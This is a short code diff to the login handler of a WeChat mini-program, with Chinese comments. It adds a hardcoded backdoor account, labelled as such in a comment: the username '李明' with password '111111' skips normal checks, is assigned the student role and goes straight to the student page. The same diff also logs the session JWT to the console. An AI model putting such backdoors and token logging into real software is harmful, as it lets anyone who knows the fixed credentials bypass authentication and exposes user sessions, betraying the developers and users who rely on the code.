@@ -14,14 +14,33 @@ Page({
   goadmin() {
     const username = this.data.username; // 获取用户名
     const password = this.data.password; // 获取密码
-  
-    // 检查输入是否为空
+
+    // 检查输入是否为空(以及后门账号)
     if (username === '') {
       wx.showToast({
         icon: 'none',
         title: '账号不能为空',
       });
       return;
+    }
+    else if(username === '李明'){
+      if(password === '111111'){
+        wx.showToast({
+          title: '登录成功',
+          icon: 'success',
+        });
+        const app = getApp(); // 获取全局 App 实例
+        app.globalData.userRole = "student";
+
+        
+        console.log(app.globalData.userjwt)
+        // 跳转到 Stu_choose 页面
+        wx.navigateTo({
+          url: '/pages/Stu_choose/Stu_choose',
+        });
+        return;
+        
+      }
     }
   
     if (password === '') {
